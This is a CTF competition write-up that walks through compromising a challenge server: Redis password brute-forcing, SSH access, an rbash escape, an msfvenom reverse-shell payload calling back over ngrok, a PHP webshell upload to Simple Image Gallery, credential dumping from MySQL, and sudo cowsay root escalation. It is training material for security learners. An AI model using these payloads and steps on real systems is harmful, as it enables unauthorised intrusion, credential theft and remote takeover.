---
layout: default
title : muzec - abcccyberhackathon CTF 2021 Finals Writeup
---

### Overview Of The CTF

As part of the 2021 Cybersecurity Conference, the American Business Council Nigeria (ABC Nigeria) in partnership with Private Sector partners are hosting a Cybersecurity Hackathon. The objective of the hackathon is to highlight the capacity in the space and show the importance of implementing a cybersecurity framework in Nigeria.

The Hackathon will award innovators for displaying their level of expertise and skills in developing solutions to cyber challenges. A Cyber Award will be allocated in kind and will be distributed among the top three winners. 

Cyber Awards will be awarded to the top three teams. Prices includes Laptops, Cybersecurity Certificates, Bootcamp for winners on Security in IBM Cloud, Cisco Certified CyberOps Associate Certifications for the Team Captains and Merchandise. The Award is sponsored by Cisco, IBM, Comercio and American Business Council.


### Cybersecurity Hackathon Competition Finals Write Up By RedTeamNG

Damn man am so excited when working on the write up like man all the challenges are pretty cool come on Muzec just get started already lol.

###  WYSIWYG - 700 Point 

![image](https://user-images.githubusercontent.com/69868171/130941058-5408e587-fdf6-42fb-abc4-acfa02684c77.png)


Man I Keep Saying It We Always Start With An Nmap Scan.

```
muz3c@RedTeamNG:/$ nmap -sC -Pn -sV -p- 193.37.212.211 -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2021-08-26 05:51 EDT
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 49.69% done; ETC: 05:54 (0:01:41 remaining)
Nmap scan report for 193.37.212.211
Host is up (0.20s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.35 seconds
```

So we have some interesting ports 22 which is SSH and 6379 ahhh the mighty Redis port but no HTTP or HTTPS i mean port 80 or 443 man don't google that up again lol just kidding man. I think we all know port ssh but before diving deep let look into the redis port.

### What IS Redis


Redis is an in-memory data structure store, used as a distributed, in-memory key–value database, cache and message broker, with optional durability. Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLogs, bitmaps, streams, and spatial indices. which is always on port 6379 which can always change also probably for security reason man let just hack it feel free to check redis Documentation.

### Redis Manual Enumeration

```
 redis-cli -h  193.37.212.211
 ```
 
 ![image](https://user-images.githubusercontent.com/69868171/130943953-d2b38248-c655-4145-a841-d3f440a5afc4.png)

Seems anonymous logins is not allowed let try brute forcing with hydra.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ hydra -P /usr/share/wordlists/rockyou.txt  193.37.212.211  redis         
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-26 08:05:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking redis://193.37.212.211:6379/
[6379][redis] host: 193.37.212.211   password: hotdog
[STATUS] 2964.00 tries/min, 2964 tries in 00:01h, 14341435 to do in 80:39h, 16 active
```

Ahhh nice we have the password now let log in redis again with the new credentials.

![image](https://user-images.githubusercontent.com/69868171/130944608-82c019eb-b151-4af1-b8e0-3da5040fadc7.png)

We are in typing `info` give us some more information about the databases and bla bla bla now let dump something using `redis-dump` .

```
redis-dump -u  193.37.212.211  -a hotdog > full.json
```

![image](https://user-images.githubusercontent.com/69868171/130945239-7519d0c7-1a42-466c-a7e8-116f2d28125f.png)

Avoid the `wget bla bla bla` i don't know what the dude is trying to wget again in redis now we have the credentials let just crack the hash.

![image](https://user-images.githubusercontent.com/69868171/130945574-eddcabc4-1e04-462d-b484-dcd01dd69b31.png)

we have credentials for SSH now.

```
lowprivuser
passw0rd123
```

But let go back to the redis and try and read the databases manually.

![image](https://user-images.githubusercontent.com/69868171/130945872-8d5ef1bb-2921-41be-a0f0-a75f18c2e2ef.png)

```
SELECT 0
KEYS *
GET "lowprivuser"
```

![image](https://user-images.githubusercontent.com/69868171/130946749-9b9c1a17-b35d-421d-88b0-ff6e2287c1d7.png)

Now back using SSH.


![image](https://user-images.githubusercontent.com/69868171/130946971-a348c3a1-bb91-4691-9948-1dc2c25345a7.png)

We are in let check the shell we have `echo $SHELL` .

![image](https://user-images.githubusercontent.com/69868171/130947062-0afcd91a-2068-43e0-8bf3-ba68c8c40cb2.png)

Ahhh rbash restricted lol `rudefish` i will get you lol.

![image](https://user-images.githubusercontent.com/69868171/130947229-c003ce4b-c5c4-4ce6-b409-160f11b2cc4e.png)

`sudo -l` but nothing let check how many users we have on the linux system first.

![image](https://user-images.githubusercontent.com/69868171/130947389-36b0d7ab-345f-4258-a4fe-eaf728887363.png)

More users cool let go to the home directory but seems we are still restricted let break out of it.

![image](https://user-images.githubusercontent.com/69868171/130947620-69f8c865-f3b8-4767-8bd9-0d66aca1c626.png)

### Breaking Out With VI

```
vi
:set shell=/bin/sh
:shell 
```

![image](https://user-images.githubusercontent.com/69868171/130947914-44de0188-1df6-4579-8763-4f645a56897b.png)

![image](https://user-images.githubusercontent.com/69868171/130947965-d0b4cc85-ab31-4c98-8648-dc5bf53400fb.png)

We have no access to `abcctf` folder now let find way to move our privilege

![image](https://user-images.githubusercontent.com/69868171/130948113-c9b0974d-38ab-44af-82b6-1c1a077f1a79.png)

We have port 80 running locally and mysql port also dns port now let port forward using SSH.

```
ssh -L 8080:localhost:80 lowprivuser@193.37.212.211
```

![image](https://user-images.githubusercontent.com/69868171/130949150-b78222e4-15d0-4720-8ddb-65fe06ece995.png)

Accessing `localhost:8080`

![image](https://user-images.githubusercontent.com/69868171/130950252-26fc6d72-f2a7-40fb-860b-bb04bf3120b0.png)

But i have no idea why am having problem using the SSH port fowarding let transfer it man i hate using Metasploit.

### Generating Payload With Msfvenom 

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=2.tcp.ngrok.io LPORT=10969 -f elf > shell.elf
```

NOTE:- i will be using ngrok to recieve back connection actually it pretty cool you should try it.

![image](https://user-images.githubusercontent.com/69868171/130972937-40df2fd5-2085-4e5b-b24e-40cf4a1be1db.png)

Seems we have generate our payload and our listener is ready on msfconsole.

![image](https://user-images.githubusercontent.com/69868171/130973228-ef4cad67-b880-483d-9512-835273a7b328.png)

NOTE:- you need to transfer your payload to the target also to execute it.

![image](https://user-images.githubusercontent.com/69868171/130973544-86fbd880-8b75-4dd3-bb07-ca4f1293a1b4.png)

Checking Our listener and boom a Meterpreter session 1 opened.

![image](https://user-images.githubusercontent.com/69868171/130974822-8c1fb403-a723-459a-bac9-a90265672878.png)

```
portfwd add -l 80 -p 80 -r 127.0.0.1
```

Port Forwarding i know you know.

![image](https://user-images.githubusercontent.com/69868171/130978479-ae8c8c25-f79a-4b9b-a652-a33993cef73c.png)

Now accessing the webserver on our localhost.

![image](https://user-images.githubusercontent.com/69868171/130978505-512f52cf-ed44-4ec9-ae9f-e1e0190373f4.png)

Now let try and create account.

![image](https://user-images.githubusercontent.com/69868171/130978665-dbbe5106-a5e5-4a29-9791-7d0b370e7714.png)

We are in.

![image](https://user-images.githubusercontent.com/69868171/130978730-eaabf704-8358-44c6-bb38-a900a1915a2f.png)


Simple Image Gallery System 1.0 a quick google search and we know it vulnerable to SQL injection and RCE but seems we register a user let hit the RCE.

![image](https://user-images.githubusercontent.com/69868171/130989082-9895fcc0-b654-49de-8586-fdbf85519938.png)

So i decided to upload a php command injection code on the profile picture page.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ cat shell.php     
<?php system ($_GET['cmd']) ?>
```

![image](https://user-images.githubusercontent.com/69868171/130989389-4e022a96-aa68-452e-ba4f-5e36fd69b1f6.png)

Boom we have command injection now let get a reverse shell.

![image](https://user-images.githubusercontent.com/69868171/130993445-f55af863-e5c6-43f1-b8f6-5045fd3d0aef.png)

Checking our Ncat listener back.

![image](https://user-images.githubusercontent.com/69868171/130993509-35986298-2869-4e89-a2f0-0a42ed060a37.png)

Now let spawn a tty shell.

```
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```

Now let enumerate more on the target using `linpeas.sh` .

![image](https://user-images.githubusercontent.com/69868171/130996588-77e17f72-bc85-469b-a211-5566fd41fc5c.png)

```
/var/www/html/gallery/initialize.php:if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"forthedubs");                                                                   
```

```
/var/www/html/gallery/initialize.php:if(!defined('DB_USERNAME')) define('DB_USERNAME',"www-data");                                                                     
```

Ahhh we have some credential for the database let try it on mysql.

![image](https://user-images.githubusercontent.com/69868171/130998271-8f85d294-9e3b-4520-8095-d414f4e72976.png)

We are in.

![image](https://user-images.githubusercontent.com/69868171/130998467-bb9593af-3592-45d6-afd8-7f88549e5478.png)

```
mysql> SELECT * from users;
SELECT * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+-------------------
--+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added        
  | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+-------------------
--+---------------------+
|  1 | Adminstrator | Admin    | admin    | 0192023a7bbd73250516f069df18b500 | uploads/1629675420_TagorbnpwmgzgrsorojLetta.php | NULL       |    1 | 2021-01-20 14:02:3
7 | 2021-08-22 23:37:40 |
|  2 | Jane         | Doe      | abcctf   | zburhWD2B7PqTx6sVfVszBE3KhgCqT   | uploads/1624240500_avatar.png                   | NULL       |    1 | 2021-01-20 14:02:3
7 | 2021-06-21 09:55:07 |
| 10 | rat          | rat      | rat      | d285ed4b87f365a2273842b0208a60c8 | NULL                                            | NULL       |    0 | 2021-08-23 20:56:2
0 | NULL                |
| 11 | bots         | bots     | bots     | 2241bbfb8e26f6de627e38a1bbcdc9a9 | uploads/1629752160_webshell.php                 | NULL       |    0 | 2021-08-23 20:56:3
3 | NULL                |
| 12 | ratty        | rattyu   | ratty    | d285ed4b87f365a2273842b0208a60c8 | uploads/1629752220_Capture.PNG                  | NULL       |    0 | 2021-08-23 20:57:4
7 | NULL                |
| 13 | bots         | bots     | bots     | 21f1a6f87b2137da269ccb2e3030889a | uploads/1629752280_webshell.php                 | NULL       |    0 | 2021-08-23 20:58:1
8 | NULL                |
| 14 | bots         | bots     | bots     | 21f1a6f87b2137da269ccb2e3030889a | uploads/1629752280_webshell.php                 | NULL       |    0 | 2021-08-23 20:58:2
5 | NULL                |
| 15 | ratty        | ratty    | ratty    | 289462fcc025ce66f113ac73a13131cf | uploads/1629752400_God.png                      | NULL       |    0 | 2021-08-23 21:00:5
8 | NULL                |
| 16 |              |          | ratty    | d285ed4b87f365a2273842b0208a60c8 | NULL                                            | NULL       |    0 | 2021-08-23 21:06:0
7 | NULL                |
| 17 | Musa         | saminu   | muzec    | bc05d7cbe414aa0f785d54525c2f822d | uploads/1629994260_shell.php                    | NULL       |    0 | 2021-08-26 14:13:3
9 | 2021-08-26 16:11:48 |
| 18 | Musa         | Saminu   | muzec    | bc05d7cbe414aa0f785d54525c2f822d | uploads/1629987780_muzec.png                    | NULL       |    0 | 2021-08-26 14:23:1
0 | NULL                |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+-------------------
```

I was able to dump some users credentials but the one that i found interesting is;

```
|  2 | Jane         | Doe      | abcctf   | zburhWD2B7PqTx6sVfVszBE3KhgCqT   | uploads/1624240500_avatar.png                   | NULL       |    1 | 2021-01-20 14:02:3 
```

We have abcctf running on the system also let try it using `su abcctf` with the password .

![image](https://user-images.githubusercontent.com/69868171/130999074-2d575a58-ca00-4037-a7de-0279921141fe.png)

We are in hahhahahaha and also we can run sudo.

![image](https://user-images.githubusercontent.com/69868171/130999177-8ee78ed2-d9e0-4391-965e-5432a5ad99a4.png)

We have the first part of the flag now let root it.

### ROOT

![image](https://user-images.githubusercontent.com/69868171/131000717-969b0859-b681-4f3d-9b2a-fb4830a5f28c.png)

```
abcctf@vps:~$ sudo -l
Matching Defaults entries for abcctf on vps:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User abcctf may run the following commands on vps:
    (root) /usr/games/cowsay
abcctf@vps:~$ TF=$(mktemp)
abcctf@vps:~$ echo 'exec "/bin/sh";' >$TF
abcctf@vps:~$ sudo /usr/games/cowsay -f $TF x
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
final_part.txt  snap
# cat final_part.txt
Congratulations, you made it to the end. Herer is the remaining part of your flag.

0r_4re_clos3r_than_they_app34r}
# echo "Muzec is Here" > .root.txt
# 
```

We are done fun right?? hahahahaha

Final Flag:- `abcctf{0bjects_!n_the_Mirr0r_4re_clos3r_than_they_app34r}`
